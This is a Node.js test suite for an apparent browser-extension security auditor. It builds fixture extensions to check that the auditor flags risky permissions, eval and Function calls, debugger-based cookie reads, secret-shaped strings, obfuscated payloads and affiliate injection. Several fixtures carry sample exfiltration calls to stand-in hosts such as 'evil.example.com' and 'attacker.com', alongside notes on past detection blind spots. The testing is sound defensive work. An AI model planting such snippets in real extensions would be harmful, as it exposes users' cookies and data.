import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { auditExtension, collectEndpointsFromContent, formatAuditReport } from '../src/audit.js';
import { buildEntryPointMap } from '../src/map.js';
import { diffExtensions } from '../src/diff.js';
import { summarizeManifest } from '../src/manifest.js';

function makeExtension(dir, { manifest, files }) {
  writeFileSync(path.join(dir, 'manifest.json'), JSON.stringify(manifest, null, 2));
  for (const [rel, content] of Object.entries(files)) {
    const full = path.join(dir, rel);
    mkdirSync(path.dirname(full), { recursive: true });
    writeFileSync(full, content);
  }
}

test('buildEntryPointMap finds background and content scripts', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-map-'));
  const manifest = {
    name: 'Test Ext',
    version: '1.0.0',
    manifest_version: 3,
    background: { service_worker: 'bg.js' },
    action: { default_popup: 'popup.html' },
    content_scripts: [{ matches: ['https://*/*'], js: ['content.js'] }],
  };
  makeExtension(dir, {
    manifest,
    files: {
      'bg.js': 'console.log("bg");\n',
      'content.js': 'const x=1;',
      'popup.html': '<script src="popup.js"></script>',
      'popup.js': 'console.log("popup");',
    },
  });

  const map = buildEntryPointMap(dir, manifest);
  assert.equal(map.entryPoints.background, 'bg.js');
  assert.equal(map.entryPoints.popup.html, 'popup.html');
  assert.deepEqual(map.entryPoints.popup.scripts, ['popup.js']);
  assert.equal(map.entryPoints.contentScripts.length, 1);
  assert.ok(map.startHere.includes('manifest.json'));
  assert.ok(map.startHere.includes('bg.js'));
  rmSync(dir, { recursive: true });
});

test('auditExtension flags risky permissions and patterns', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = {
    name: 'Spy Ext',
    version: '2.0.0',
    manifest_version: 3,
    permissions: ['cookies', 'storage'],
    host_permissions: ['<all_urls>'],
    background: { service_worker: 'bg.js' },
  };
  const summary = {
    name: 'Spy Ext',
    version: '2.0.0',
    permissions: ['cookies', 'storage'],
    optionalPermissions: [],
    hostPermissions: ['<all_urls>'],
    contentScripts: [],
    background: 'bg.js',
  };
  makeExtension(dir, {
    manifest,
    files: {
      'bg.js': 'eval("bad"); fetch("https://evil.example.com/track");',
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  assert.ok(['high', 'critical'].includes(audit.risk.level));
  assert.ok(audit.permissions.high.includes('cookies'));
  assert.ok(audit.findings.some((f) => f.pattern === 'eval()'));
  assert.ok(audit.endpoints.includes('https://evil.example.com/track'));
  rmSync(dir, { recursive: true });
});

test('auditExtension scores optional_host_permissions and flags a custom update_url', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = {
    name: 'Sneaky Ext', version: '1.0.0', manifest_version: 3,
    permissions: ['storage'],
    optional_host_permissions: ['<all_urls>'],
    update_url: 'https://not-the-store.example.com/update.xml',
    background: { service_worker: 'bg.js' },
  };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, { manifest, files: { 'bg.js': 'console.log("ok");' } });

  const audit = auditExtension(dir, manifest, summary);
  assert.ok(audit.permissions.high.includes('<all_urls>'));
  assert.ok(audit.flags.some((f) => f.label.includes('update_url')));
  rmSync(dir, { recursive: true });
});

test('auditExtension does not flag the official Chrome Web Store update_url', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = {
    name: 'Store Ext', version: '1.0.0', manifest_version: 3,
    permissions: ['storage'],
    update_url: 'https://clients2.google.com/service/update2/crx',
    background: { service_worker: 'bg.js' },
  };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, { manifest, files: { 'bg.js': 'console.log("ok");' } });

  const audit = auditExtension(dir, manifest, summary);
  assert.ok(!audit.flags.some((f) => f.label.includes('update_url')));
  rmSync(dir, { recursive: true });
});

test('scanSource flags fetch, WebSocket, sendMessage, and executeScript', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: [], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, {
    manifest,
    files: {
      'bg.js': [
        'fetch("https://api.example.com/collect");',
        'const ws = new WebSocket("wss://api.example.com/socket");',
        'chrome.runtime.sendMessage({ type: "ping" });',
        'chrome.scripting.executeScript({ target: { tabId: 1 }, func: () => {} });',
        'chrome.tabs.executeScript(1, { code: "1" });',
      ].join('\n'),
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  const patterns = audit.findings.map((f) => f.pattern);
  assert.ok(patterns.includes('fetch()'));
  assert.ok(patterns.includes('new WebSocket()'));
  assert.ok(patterns.includes('chrome.runtime.sendMessage/connect'));
  // Split into two distinct patterns so a chrome.tabs.executeScript() call
  // can never be mistaken for the chrome.scripting.executeScript() one --
  // they have different permission requirements (see PERMISSION_PATTERN_PAIRS).
  assert.ok(patterns.includes('chrome.scripting.executeScript'));
  assert.ok(patterns.includes('chrome.tabs.executeScript'));
  rmSync(dir, { recursive: true });
});

test('scanSource flags the browser.* namespace the same as chrome.* (real extensions use both)', () => {
  // Found via a real-world checkpoint: uBlock Origin Lite calls
  // browser.scripting.executeScript(), not chrome.scripting.executeScript(),
  // and the chrome.-only regexes missed it entirely.
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: [], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, {
    manifest,
    files: {
      'bg.js': [
        'browser.cookies.getAll({}, () => {});',
        'browser.webRequest.onBeforeRequest.addListener(() => {});',
        'browser.runtime.sendMessage({ type: "ping" });',
        'browser.scripting.executeScript({ target: { tabId: 1 }, func: () => {} });',
        'browser.tabs.executeScript(1, { code: "1" });',
      ].join('\n'),
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  const patterns = audit.findings.map((f) => f.pattern);
  assert.ok(patterns.includes('chrome.cookies access'));
  assert.ok(patterns.includes('chrome.webRequest access'));
  assert.ok(patterns.includes('chrome.runtime.sendMessage/connect'));
  assert.ok(patterns.includes('chrome.scripting.executeScript'));
  assert.ok(patterns.includes('chrome.tabs.executeScript'));
  rmSync(dir, { recursive: true });
});

test('auditExtension correlates a declared permission with a browser.* API call too', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = {
    name: 'Cross-Browser Ext', version: '1.0.0', manifest_version: 3,
    permissions: ['scripting'],
    background: { service_worker: 'bg.js' },
  };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, { manifest, files: { 'bg.js': 'browser.scripting.executeScript({ target: { tabId: 1 }, func: () => {} });' } });

  const audit = auditExtension(dir, manifest, summary);
  assert.equal(audit.correlations.length, 1);
  assert.equal(audit.correlations[0].permission, 'scripting');
  assert.equal(audit.correlations[0].pattern, 'chrome.scripting.executeScript');
  rmSync(dir, { recursive: true });
});

test('scanSource flags chrome.debugger access and CDP dangerous commands', () => {
  // Found while evaluating crx-forensics as an EP+ candidate: it detects this
  // real pattern correctly (Cloud9 RAT / VenomSoftX style CDP abuse) but its
  // own risk scorer never counts the finding. Porting the detection here,
  // not the scorer.
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: ['debugger'], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, {
    manifest,
    files: {
      'bg.js': [
        'chrome.debugger.attach({ tabId: 1 }, "1.3", () => {});',
        'chrome.debugger.sendCommand({ tabId: 1 }, "Runtime.evaluate", { expression: "document.cookie" });',
        'chrome.debugger.sendCommand({ tabId: 1 }, "Network.enable", {});',
      ].join('\n'),
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  const patterns = audit.findings.map((f) => f.pattern);
  assert.ok(patterns.includes('chrome.debugger access'));
  assert.ok(patterns.filter((p) => p === 'CDP dangerous command').length >= 2);
  rmSync(dir, { recursive: true });
});

test('auditExtension correlates the debugger permission with chrome.debugger access', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: ['debugger'], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, { manifest, files: { 'bg.js': 'chrome.debugger.attach({ tabId: 1 }, "1.3", () => {});' } });

  const audit = auditExtension(dir, manifest, summary);
  assert.ok(audit.correlations.some((c) => c.permission === 'debugger' && c.pattern === 'chrome.debugger access'));
  rmSync(dir, { recursive: true });
});

test('scanSource flags real secret shapes: AWS key, GitHub token, Stripe key, Slack token, RSA private key', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: [], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  // Assembled at runtime from split halves, never as one contiguous literal
  // in this test's own source: a complete fake secret in one unbroken
  // string trips GitHub's push-protection scanner on this file (confirmed).
  // The fixture file crxray's regex actually scans still gets the full,
  // unbroken string below -- only this source file's own text is split.
  const fakeAwsKey = ['AKIA', 'ABCDEFGHIJKLMNOP'].join('');
  const fakeGhToken = ['ghp_', 'abcdefghijklmnopqrstuvwxyz0123456789'].join('');
  const fakeStripeKey = ['sk_live_', 'abcdefghijklmnopqrstuvwx'].join('');
  const fakeSlackToken = ['xoxb-111111111111-222222222222-', 'abcdefghijklmnopqrstuvwx'].join('');
  // A real key block always has a substantial base64 body after the
  // header; a bare header constant (which crypto libraries carry for
  // format detection) no longer matches on its own -- see the negative
  // test below.
  const fakeRsaBody = ['MIIEowIBAAKCAQEA', 'qwertyuiopASDFGHJKLzxcvbnmQWERTYUIOPasdfghjklZXCVBNM1234567890'].join('');

  makeExtension(dir, {
    manifest,
    files: {
      'bg.js': [
        `const awsKey = "${fakeAwsKey}";`,
        `const ghToken = "${fakeGhToken}";`,
        `const stripeKey = "${fakeStripeKey}";`,
        `const slackToken = "${fakeSlackToken}";`,
        '// -----BEGIN RSA PRIVATE KEY-----',
        fakeRsaBody,
        '// -----END RSA PRIVATE KEY-----',
      ].join('\n'),
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  const patterns = new Set(audit.findings.map((f) => f.pattern));
  assert.ok(patterns.has('AWS access key'));
  assert.ok(patterns.has('GitHub token'));
  assert.ok(patterns.has('Stripe key'));
  assert.ok(patterns.has('Slack token'));
  assert.ok(patterns.has('RSA/SSH private key block'));
  rmSync(dir, { recursive: true });
});

test('secret patterns do not flag ordinary password/apiKey identifiers with no real secret shape', () => {
  // This is the exact false-positive crx-forensics produced on Bitwarden:
  // "variable named password/apikey" matched the extension's own domain
  // vocabulary, not an actual embedded credential. Shape-matching avoids it.
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: [], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, {
    manifest,
    files: {
      'bg.js': [
        'function setPassword(password) { this.password = password; }',
        'const apiKey = config.apiKey;',
        'export const PASSWORD_FIELD_NAME = "password";',
      ].join('\n'),
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  const secretPatterns = audit.findings.filter((f) =>
    ['AWS access key', 'GitHub token', 'Stripe key', 'Slack token', 'RSA/SSH private key block'].includes(f.pattern)
  );
  assert.deepEqual(secretPatterns, []);
  rmSync(dir, { recursive: true });
});

test('secret patterns do not flag a Stripe publishable key, a placeholder token, or a bare PEM header', () => {
  // Found by independent review: pk_ (publishable) keys are designed to
  // ship in client code -- any extension with Stripe Checkout has one, and
  // it isn't a secret. A placeholder like "xoxb-your-token-here" has no
  // real workspace-id digits. A bare PEM header with no body is a crypto
  // library's own format-detection constant, not an embedded key.
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: [], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, {
    manifest,
    files: {
      'bg.js': [
        'const stripePk = "pk_live_abcdefghijklmnopqrstuvwx";',
        'const placeholder = "xoxb-your-token-here";',
        'const pemHeaderConstant = "-----BEGIN PRIVATE KEY-----";',
      ].join('\n'),
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  const secretPatterns = audit.findings.filter((f) =>
    ['AWS access key', 'GitHub token', 'Stripe key', 'Slack token', 'RSA/SSH private key block'].includes(f.pattern)
  );
  assert.deepEqual(secretPatterns, []);
  rmSync(dir, { recursive: true });
});

test('CDP dangerous-command pattern matches real Input.dispatch* method names, not just the bare verb', () => {
  // Found by independent review: the original pattern required a closing
  // quote immediately after "Input.dispatch", but real CDP commands are
  // Input.dispatchKeyEvent / dispatchMouseEvent / dispatchTouchEvent --
  // the bare form never appears in real code, so it never matched anything.
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: ['debugger'], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, {
    manifest,
    files: {
      'bg.js': 'chrome.debugger.sendCommand({ tabId: 1 }, "Input.dispatchKeyEvent", { type: "keyDown" });',
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  assert.ok(audit.findings.some((f) => f.pattern === 'CDP dangerous command'));
  rmSync(dir, { recursive: true });
});

test('affiliate-link check matches the tag= parameter and ignores === comparisons', () => {
  // Found by independent review: "tag=" is Amazon's own affiliate parameter
  // and the single most common real case, which the original pattern
  // (ref/aff/affiliate/utm_source only) missed entirely; and the original
  // [+=] matched the first "=" of "===", flagging an ordinary comparison.
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: [], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, {
    manifest,
    files: {
      'bg.js': [
        'a.href = base + "?tag=evil-20";',
        'if (location.href === "https://example.com/?ref=readme") { report(); }',
      ].join('\n'),
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  const hits = audit.findings.filter((f) => f.pattern === 'Affiliate link injection');
  assert.equal(hits.length, 1);
  assert.equal(hits[0].line, 1);
  rmSync(dir, { recursive: true });
});

test('scanSource flags a high-entropy blob paired with a decode call, and leaves readable code alone', () => {
  // Entropy alone is never enough -- see the companion tests below for why.
  // The signal is a high-entropy blob PAIRED with a decode/execute call
  // (eval, new Function, atob, a dynamic <script> tag) in the same file,
  // which is the actual shape of real obfuscated-and-run code.
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: [], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  // Deterministic high-entropy filler: real base64 alphabet only (required
  // by the per-literal check below), evenly cycled so entropy approaches
  // its true ceiling of log2(64) = 6.0 -- no real randomness needed for a
  // reproducible test.
  const base64Alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
  const highEntropy = Array.from({ length: 1280 }, (_, i) => base64Alphabet[(i * 17) % base64Alphabet.length]).join('');
  const readable = 'function greet(name) {\n  return "Hello, " + name + "!";\n}\n'.repeat(20);
  makeExtension(dir, {
    manifest,
    files: {
      'blob.js': `const payload = "${highEntropy}"; eval(payload);`,
      'normal.js': readable,
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  const entropyHits = audit.findings.filter((f) => f.pattern === 'High entropy (possible obfuscation)');
  assert.ok(entropyHits.some((f) => f.file === 'blob.js'));
  assert.ok(!entropyHits.some((f) => f.file === 'normal.js'));
  rmSync(dir, { recursive: true });
});

test('entropy check does not flag a bare high-entropy blob with no decode call anywhere in the file', () => {
  // Found on real code, twice, in two different shapes: Scrnli's
  // wakaru-unpacked bundle had 45 modules of the exact shape
  // `module.exports = "data:font/woff2;base64,...";` (a legitimately
  // embedded web font), and Grammarly had 8 modules passing a base64
  // protobuf schema as a plain function-call argument -- different enough
  // syntax that a shape-specific exclusion for one would have missed the
  // other. Neither had a decode/execute call anywhere nearby, which is
  // exactly why entropy alone over-fires on both: base64-encoded binary
  // data is inherently high-entropy regardless of what it encodes.
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: [], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  // Real base64 alphabet only (A-Za-z0-9+/), evenly cycled -- entropy
  // approaches its true ceiling of exactly log2(64) = 6.0 at this length,
  // same as the real font/schema data that motivated this test (confirmed
  // empirically, not just asserted).
  const base64Alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
  const base64Payload = Array.from({ length: 1280 }, (_, i) => base64Alphabet[(i * 17) % base64Alphabet.length]).join('');
  makeExtension(dir, {
    manifest,
    files: {
      'font-asset.js': `module.exports = "data:font/woff2;base64,${base64Payload}";`,
      'schema-asset.js': `export const schema = decodeProtobufSchema("${base64Payload}");`,
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  const entropyHits = audit.findings.filter((f) => f.pattern === 'High entropy (possible obfuscation)');
  assert.deepEqual(entropyHits, []);
  rmSync(dir, { recursive: true });
});

test('entropy check does not flag an embedded font sitting near an UNRELATED decode call in a large file', () => {
  // Found by independent review: an earlier file-wide version of the
  // companion check (any decode call anywhere in the file, no matter how
  // far away) still flagged a legitimate embedded font as "possible
  // obfuscation" whenever the same large bundle happened to contain an
  // unrelated atob() call somewhere else in the same file, e.g. a JWT
  // parser thousands of characters away. Moving to a proximity window
  // around the literal's own position, not "anywhere in the file", fixes
  // this directly: the unrelated call is far outside the window.
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: [], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  const base64Alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
  const base64Payload = Array.from({ length: 1280 }, (_, i) => base64Alphabet[(i * 17) % base64Alphabet.length]).join('');
  const padding = '// unrelated vendor code\n'.repeat(200); // thousands of chars of real distance
  makeExtension(dir, {
    manifest,
    files: {
      // The literal itself is pure base64 (no "data:" prefix) so it still
      // qualifies as a high-entropy candidate; what's under test is
      // whether the FAR-AWAY atob() call wrongly counts as its companion.
      'vendor-bundle.js': [
        `const embeddedFont = "${base64Payload}";`,
        padding,
        'function parseJwt(token) { return JSON.parse(atob(token.split(".")[1])); }',
      ].join('\n'),
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  const entropyHits = audit.findings.filter((f) => f.pattern === 'High entropy (possible obfuscation)');
  assert.deepEqual(entropyHits, []);
  rmSync(dir, { recursive: true });
});

test('scanSource flags Function() called without new, the same as new Function()', () => {
  // Red-team finding, confirmed by running the real CLI against a built
  // fixture, not assumed: dropping `new` defeated the function-constructor
  // pattern entirely -- a confirmed total blind spot, since Function(x)()
  // runs identically to new Function(x)() for this purpose. Widened to
  // match both forms as ONE pattern, so a real `new Function()` call is
  // still counted exactly once, not twice.
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: [], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, {
    manifest,
    files: {
      'bare.js': 'const run = Function("return 1+1"); run();',
      'withnew.js': 'const run = new Function("return 1+1"); run();',
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  const hits = audit.findings.filter((f) => f.pattern === 'Function() constructor');
  assert.equal(hits.filter((f) => f.file === 'bare.js').length, 1);
  assert.equal(hits.filter((f) => f.file === 'withnew.js').length, 1);
  rmSync(dir, { recursive: true });
});

test('scanSource flags setTimeout()/setInterval() calls', () => {
  // Red-team finding: setTimeout(decodedPayload, 0) implicitly executes a
  // string argument exactly like eval() does, and the pattern list had
  // zero coverage for setTimeout/setInterval at all -- confirmed as a total
  // blind spot by running the real CLI, not just a miss on the entropy
  // companion pairing below. Flagged at low severity, same tier as
  // fetch()/XMLHttpRequest: ubiquitous and usually benign on its own.
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: [], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, {
    manifest,
    files: {
      'bg.js': ['setTimeout(doStuff, 100);', 'setInterval(poll, 5000);'].join('\n'),
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  const patterns = audit.findings.map((f) => f.pattern);
  assert.equal(patterns.filter((p) => p === 'setTimeout()/setInterval()').length, 2);
  rmSync(dir, { recursive: true });
});

test('entropy check recognizes setTimeout()/setInterval() as a decode-companion, closing a confirmed red-team gap', () => {
  // Confirmed by direct red-team testing against the real CLI:
  // setTimeout(decodedPayload, 0) is invisible to the entropy-companion
  // pairing because setTimeout/setInterval had no SUSPICIOUS_PATTERNS entry
  // at all, so no companion position could ever be recorded near the
  // literal. Now a companion pattern, same tier as atob.
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: [], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  const base64Alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
  const highEntropy = Array.from({ length: 1280 }, (_, i) => base64Alphabet[(i * 17) % base64Alphabet.length]).join('');
  makeExtension(dir, {
    manifest,
    files: {
      'blob.js': `const payload = "${highEntropy}"; setTimeout(payload, 0);`,
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  const entropyHits = audit.findings.filter((f) => f.pattern === 'High entropy (possible obfuscation)');
  assert.ok(entropyHits.some((f) => f.file === 'blob.js'));
  rmSync(dir, { recursive: true });
});

test('scanSource flags affiliate link injection and review-nagging URLs', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: [], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, {
    manifest,
    files: {
      'bg.js': [
        'link.href = baseUrl + "?ref=myaffid123";',
        'const plainLink = "https://example.com/page"; el.href = plainLink;',
        'window.open("https://chromewebstore.google.com/detail/myext/abc123/reviews");',
      ].join('\n'),
    },
  });

  const audit = auditExtension(dir, manifest, summary);
  const patterns = audit.findings.map((f) => f.pattern);
  assert.ok(patterns.includes('Affiliate link injection'));
  assert.ok(patterns.includes('Review-nagging store URL'));
  // the plain, non-affiliate href must not itself trip the affiliate check
  assert.equal(patterns.filter((p) => p === 'Affiliate link injection').length, 1);
  rmSync(dir, { recursive: true });
});

test('a finding on a long minified line snippets the match itself, not unrelated text before it', () => {
  // Found on real code (Honey's vendor bundle): the match lived far past
  // column 120 on a long single-line file, and the old snippet (first 120
  // chars of the line) never showed it -- the finding was still correct
  // (right file/line/pattern), but the preview text was misleading.
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Ext', version: '1.0.0', manifest_version: 3, permissions: [], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  const filler = 'x'.repeat(300);
  makeExtension(dir, { manifest, files: { 'bg.js': `var ${filler} = 1; eval("danger");` } });

  const audit = auditExtension(dir, manifest, summary);
  const finding = audit.findings.find((f) => f.pattern === 'eval()');
  assert.ok(finding, 'expected an eval() finding');
  assert.match(finding.snippet, /eval\(/);
  rmSync(dir, { recursive: true });
});

test('auditExtension does not double-count a bundle superseded by its .unpacked copy', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = {
    name: 'Bundled Ext', version: '1.0.0', manifest_version: 3,
    permissions: ['storage'],
    background: { service_worker: 'bundle.js' },
  };
  const summary = {
    name: 'Bundled Ext', version: '1.0.0', permissions: ['storage'],
    optionalPermissions: [], hostPermissions: [], contentScripts: [], background: 'bundle.js',
  };
  makeExtension(dir, {
    manifest,
    files: { 'bundle.js': 'eval("original"); fetch("https://original.example.com");' },
  });
  // Simulate what deobfuscateDirectory leaves behind after unpacking a bundle.
  mkdirSync(path.join(dir, 'bundle.unpacked'));
  writeFileSync(
    path.join(dir, 'bundle.unpacked', 'module.js'),
    'eval("original"); fetch("https://original.example.com");'
  );

  const audit = auditExtension(dir, manifest, summary);
  const evalFindings = audit.findings.filter((f) => f.pattern === 'eval()');
  assert.equal(evalFindings.length, 1); // only from bundle.unpacked/module.js, not bundle.js too
  assert.equal(evalFindings[0].file, 'bundle.unpacked/module.js');
  assert.deepEqual(audit.endpoints, ['https://original.example.com']);
  rmSync(dir, { recursive: true });
});

test('computeRisk does not let repeated hits of one pattern in one file dominate the score', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  const manifest = { name: 'Chatty Lib', version: '1.0.0', manifest_version: 3, permissions: ['storage'], background: { service_worker: 'bg.js' } };
  const summary = summarizeManifest(manifest);
  makeExtension(dir, {
    manifest,
    files: { 'bg.js': Array.from({ length: 50 }, () => 'eval("x");').join('\n') },
  });

  const audit = auditExtension(dir, manifest, summary);
  // 50 raw eval() hits in one file, but risk scoring should treat it as one
  // distinct (file, pattern) signal, not 50 — low/medium/high, not critical.
  assert.notEqual(audit.risk.level, 'critical');
  assert.equal(audit.findings.filter((f) => f.pattern === 'eval()').length, 50); // detail list unchanged
  rmSync(dir, { recursive: true });
});

test('collectEndpointsFromContent extracts URLs', () => {
  const eps = collectEndpointsFromContent('fetch("https://api.example.com/v1")');
  assert.deepEqual(eps, ['https://api.example.com/v1']);
});

test('collectEndpointsFromContent excludes only exact mozilla.org/w3.org hosts, not attacker lookalikes', () => {
  const content = [
    'fetch("https://developer.mozilla.org/docs")',
    'fetch("https://www.w3.org/TR/spec")',
    'fetch("https://evilmozilla.org.attacker.com/steal")',
    'fetch("https://api.example.com/collect")',
  ].join('\n');

  const eps = collectEndpointsFromContent(content).sort();
  assert.deepEqual(eps, ['https://api.example.com/collect', 'https://evilmozilla.org.attacker.com/steal'].sort());
});

test('diffExtensions detects permission and file changes', () => {
  const left = mkdtempSync(path.join(tmpdir(), 'crxray-left-'));
  const right = mkdtempSync(path.join(tmpdir(), 'crxray-right-'));

  makeExtension(left, {
    manifest: {
      name: 'Ext',
      version: '1.0.0',
      manifest_version: 3,
      permissions: ['storage'],
    },
    files: { 'a.js': 'const a = 1;', 'old.js': 'x' },
  });

  makeExtension(right, {
    manifest: {
      name: 'Ext',
      version: '1.1.0',
      manifest_version: 3,
      permissions: ['storage', 'tabs'],
      host_permissions: ['https://*/*'],
    },
    files: { 'a.js': 'const a = 2;', 'new.js': 'y' },
  });

  const diff = diffExtensions(left, right);
  assert.equal(diff.left.version, '1.0.0');
  assert.equal(diff.right.version, '1.1.0');
  assert.deepEqual(diff.permissionChanges.added, ['tabs']);
  assert.deepEqual(diff.permissionChanges.hostAdded, ['https://*/*']);
  assert.deepEqual(diff.files.added, ['new.js']);
  assert.deepEqual(diff.files.removed, ['old.js']);
  const modifiedPaths = diff.files.modified.map((m) => m.path);
  assert.ok(modifiedPaths.includes('a.js'));
  assert.ok(modifiedPaths.includes('manifest.json'));

  rmSync(left, { recursive: true });
  rmSync(right, { recursive: true });
});

test('diffExtensions reports endpoints from added and removed files, not just modified ones', () => {
  const left = mkdtempSync(path.join(tmpdir(), 'crxray-left-'));
  const right = mkdtempSync(path.join(tmpdir(), 'crxray-right-'));

  makeExtension(left, {
    manifest: { name: 'Ext', version: '1.0.0', manifest_version: 3 },
    files: { 'old.js': 'fetch("https://old-only.example.com")' },
  });
  makeExtension(right, {
    manifest: { name: 'Ext', version: '1.1.0', manifest_version: 3 },
    files: { 'new.js': 'fetch("https://new-only.example.com")' },
  });

  const diff = diffExtensions(left, right);
  assert.deepEqual(diff.endpointChanges.added, ['https://new-only.example.com']);
  assert.deepEqual(diff.endpointChanges.removed, ['https://old-only.example.com']);

  rmSync(left, { recursive: true });
  rmSync(right, { recursive: true });
});

test('auditExtension never scans files inside a <name>.wakaru directory with a sibling <name>.js', () => {
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  writeFileSync(path.join(dir, 'bundle.js'), 'minified');
  mkdirSync(path.join(dir, 'bundle.wakaru'));
  writeFileSync(path.join(dir, 'bundle.wakaru', 'module-0.js'), 'eval("danger"); fetch("https://evil.example.com");');
  writeFileSync(path.join(dir, 'clean.js'), 'console.log("fine");');

  const audit = auditExtension(dir, null, null);
  assert.equal(audit.findings.length, 0);
  assert.equal(audit.endpoints.length, 0);
  rmSync(dir, { recursive: true });
});

test('auditExtension still scans a shipped <name>.wakaru lookalike with no sibling <name>.js', () => {
  // A directory named like wakaru's own output convention, but with no
  // corresponding original .js file next to it, is not provably crxray's
  // own output — an extension could ship one deliberately to hide code
  // from the auditor. It must still be scanned.
  const dir = mkdtempSync(path.join(tmpdir(), 'crxray-audit-'));
  mkdirSync(path.join(dir, 'evil.wakaru'));
  writeFileSync(path.join(dir, 'evil.wakaru', 'payload.js'), 'eval("danger"); fetch("https://evil.example.com");');

  const audit = auditExtension(dir, null, null);
  assert.equal(audit.findings.length, 2);
  assert.equal(audit.endpoints.length, 1);
  rmSync(dir, { recursive: true });
});

